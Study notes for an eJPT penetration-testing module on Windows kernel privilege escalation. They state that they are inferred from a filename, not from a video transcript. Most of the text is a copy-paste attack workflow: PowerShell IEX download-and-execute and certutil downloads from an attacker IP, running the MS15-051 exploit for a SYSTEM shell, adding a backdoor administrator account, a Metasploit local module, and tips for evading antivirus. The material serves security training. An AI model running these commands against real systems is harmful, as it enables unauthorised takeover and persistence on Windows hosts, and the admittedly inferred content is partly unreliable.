# 01 - Windows Kernel Exploits (eJPT) — Study Notes

Note: No transcript was provided. The following is a careful, conservative summary inferred from the filename and folder (03-WindowsPrivilegeEscalation) plus standard eJPT lab workflow for Windows kernel-based local privilege escalation.

## What the video covers (Introduction / big picture)
- Where Windows kernel exploits fit in privilege escalation: exploiting kernel-mode (ring-0) vulnerabilities (e.g., win32k.sys, ntoskrnl) to escalate from a low-priv user to NT AUTHORITY\SYSTEM.
- When to use them: after basic misconfig checks fail and you’ve confirmed OS/build and patch level suggests a known kernel EoP (Elevation of Privilege) vulnerability is present.
- How to safely approach kernel exploits: version/architecture matching, known-stable CVEs, lab-first testing, and avoiding production/DC targets due to BSOD risk.
- A typical workflow: enumerate OS + hotfixes → suggest candidates (WES-NG/Watson/Sherlock) → pick a matching CVE (e.g., MS15-051) → transfer and run exploit → verify SYSTEM → cleanup.

## Flow (ordered)
1. Confirm you have a shell on the Windows target (low-priv).
2. Enumerate OS, architecture, build number, and hotfixes.
3. Save systeminfo output and analyze it with an exploit suggester (WES-NG/Watson/Sherlock).
4. Filter for Elevation of Privilege issues with public exploits.
5. Choose a stable kernel exploit matching the exact OS/build (e.g., MS15-051 for certain Win7/2008R2 builds).
6. Transfer the exploit binary to the target using built-ins (certutil/PowerShell Invoke-WebRequest/curl/bitsadmin).
7. Execute exploit to spawn a SYSTEM shell or run a SYSTEM command (e.g., add local admin user).
8. Verify escalation (whoami /all).
9. Post-exploitation (tokens/files/creds) and cleanup artifacts.

## Tools highlighted
- Built-in Windows:
  - systeminfo, ver, whoami /priv, whoami /all
  - wmic os get Caption,Version,BuildNumber,OSArchitecture
  - wmic qfe get HotFixID,InstalledOn,Description
  - reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
  - certutil, PowerShell Invoke-WebRequest, curl (Win10+), bitsadmin
- Suggesters/Enumerators:
  - WES-NG (Windows Exploit Suggester—NG)
  - Sherlock.ps1 (PowerShell, checks for known missing MS bulletins)
  - Watson (C# binary; enumerates missing patches/CVEs)
  - winPEAS/Seatbelt (general privesc enumeration)
- Exploitation (examples):
  - MS15-051 (CVE-2015-1701) win32k.sys EoP (commonly demoed, stable on certain builds)
  - Metasploit local modules for kernel EoP (optional, if you already have a Meterpreter session)

## Typical command walkthrough (detailed, copy-paste friendly)

Assumptions:
- Attacker IP: 10.10.14.2
- HTTP server on attacker: python3 -m http.server 8000
- Target is a lab host you’re allowed to test.

1) Enumerate OS/build/patch level on the target
```
whoami
whoami /all
whoami /priv

ver
systeminfo

wmic os get Caption,Version,BuildNumber,OSArchitecture
wmic qfe get HotFixID,InstalledOn,Description

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v BuildLabEx
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ReleaseId
```

Save relevant info to files (optional):
```
systeminfo > C:\Users\Public\systeminfo.txt
wmic qfe get HotFixID,InstalledOn,Description > C:\Users\Public\hotfixes.txt
```

2) Get systeminfo to your attacker box (easy way: copy/paste from terminal). Or host-side suggesters can parse manually.

3) On the attacker, run WES-NG (Windows Exploit Suggester—NG)
- Install and update database:
```
pip3 install wesng --user
~/.local/bin/wesng --update
```
- Analyze systeminfo for Elevation of Privilege vulns with public exploits:
```
~/.local/bin/wesng -e -i "Elevation of Privilege" systeminfo.txt > wesng-eop.txt
```
Notes:
- Use wesng -h to confirm flags on your version.
- -e limits to vulns with known public exploits.
- -i filters by impact (e.g., “Elevation of Privilege”).

4) PowerShell-based checker (alternative) — Sherlock
- One-liner to load and run Sherlock in memory (no file write):
```
powershell -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2:8000/Sherlock.ps1'); Find-AllVulns"
```
Expected: Lists vulnerable MS bulletins (e.g., MS15-051) if applicable.

5) C# binary checker (alternative) — Watson
- Transfer:
```
certutil -urlcache -f http://10.10.14.2:8000/Watson.exe Watson.exe
```
- Run:
```
Watson.exe
```
Expected: Displays OS, missing patches, and candidate CVEs.

6) Select a known-stable kernel LPE exploit for the target (example: MS15-051)
- Transfer the exploit binary (example filename placeholder):
```
certutil -urlcache -f http://10.10.14.2:8000/MS15-051x64.exe MS15-051.exe
```

7) Execute exploit
Many Windows local EoP PoCs accept a command to run as SYSTEM. Two common patterns:
- Spawn a SYSTEM cmd:
```
MS15-051.exe "cmd.exe"
```
- Run an administrative action (add a local admin user), then get a shell:
```
MS15-051.exe "cmd.exe /c net user jack P@ssw0rd! /add && net localgroup administrators jack /add"
```
If the exploit’s usage differs, run its help or try passing just “cmd.exe”. Adjust to the specific PoC’s syntax.

8) Verify escalation and context
From the new shell or after the command runs:
```
whoami
whoami /all
```
You want: NT AUTHORITY\SYSTEM.

9) Cleanup (lab hygiene)
```
del C:\Users\Public\MS15-051.exe
del C:\Users\Public\Watson.exe
```

Optional: Metasploit approach (if you already have a Meterpreter session)
- Example module (depends on target/build):
```
msfconsole
use exploit/windows/local/ms15_051_client_copy_image
set SESSION 1
set LHOST 10.10.14.2
set LPORT 4444
run
```
Verify gets SYSTEM, then interact with the new session.

## Practical tips
- Prefer safer privesc first: misconfigs, weak services, token impersonation. Kernel exploits are last resort due to BSOD risk.
- Match exactly: OS name, SP, build number, architecture, and missing hotfixes. A mismatched kernel exploit can crash the box.
- Use known-stable CVEs for the target’s build. WES-NG/Sherlock/Watson help you shortlist.
- AV/EDR may flag public PoCs. Renaming binaries, alternate download methods, or compiling yourself can help in labs.
- PowerShell execution policy bypass is runtime-only; it doesn’t permanently change system policy.
- If systeminfo is blocked, pull from registry and wmic os. You can also parse wuauserv logs or qfe as a fallback.
- Test in a lab VM matching target OS when possible to validate exploit stability before running on the real target.
- Don’t run kernel exploits on Domain Controllers or critical servers in real environments.

## Minimal cheat sheet (one-screen flow)
```
:: Target: enumerate
whoami & whoami /all & whoami /priv
wmic os get Caption,Version,BuildNumber,OSArchitecture
wmic qfe get HotFixID,InstalledOn,Description
systeminfo > C:\Users\Public\systeminfo.txt

:: Attacker: suggest exploits
pip3 install wesng --user
~/.local/bin/wesng --update
~/.local/bin/wesng -e -i "Elevation of Privilege" systeminfo.txt > wesng-eop.txt

:: Optional in-memory Sherlock
powershell -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2:8000/Sherlock.ps1'); Find-AllVulns"

:: Transfer chosen exploit (example: MS15-051)
certutil -urlcache -f http://10.10.14.2:8000/MS15-051x64.exe MS15-051.exe

:: Execute (spawn SYSTEM shell)
MS15-051.exe "cmd.exe"

:: Or execute a SYSTEM command (add local admin)
MS15-051.exe "cmd.exe /c net user jack P@ssw0rd! /add && net localgroup administrators jack /add"

:: Verify and cleanup
whoami & whoami /all
del C:\Users\Public\MS15-051.exe
```

## Summary
- Kernel exploits target OS kernel components (e.g., win32k.sys) to escalate privileges to SYSTEM. They’re powerful but risky—use only when OS/build/hotfix analysis strongly indicates a matching, stable CVE.
- The core workflow: enumerate OS/build/hotfixes → run a suggester (WES-NG/Watson/Sherlock) → pick a kernel EoP that fits → transfer and run exploit → verify SYSTEM → clean up.
- In eJPT-style labs, MS15-051 and similar win32k.sys EoPs are commonly demonstrated. Precision in version/architecture, careful tooling, and minimal footprint help you escalate reliably without crashing the target.